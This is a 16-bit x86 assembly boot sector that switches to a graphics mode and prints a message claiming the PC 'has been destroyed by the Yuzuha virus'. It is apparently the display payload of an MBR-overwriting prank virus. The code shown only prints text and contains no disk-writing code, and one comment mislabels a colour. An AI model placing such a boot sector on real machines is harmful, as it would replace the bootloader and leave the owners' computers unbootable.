[BITS 16]
[ORG 7C00h]
    jmp     main
main:
    xor     ax, ax     ; DS=0
    mov     ds, ax
    cld                ; DF=0 because our LODSB requires it
    mov     ax, 0012h  ; Select 640x480 16-color graphics video mode
    int     10h
    mov     si, string
    mov     bl, 9      ; Red
    call    printstr
    jmp     $

printstr:
    mov     bh, 0     ; DisplayPage
print:
    lodsb
    cmp     al, 0
    je      done
    mov     ah, 0Eh   ; BIOS.Teletype
    int     10h
    jmp     print
done:
    ret

string db "Your PC has been destroyed by the Yuzuha virus", 13, 10, "You're defeat....", 13, 10, "YuzuhaVirus Create by yukkuributti", 13, 10,"&", 13, 10,"Mist", 13, 10,

times 510 - ($-$$) db 0
dw      0AA55h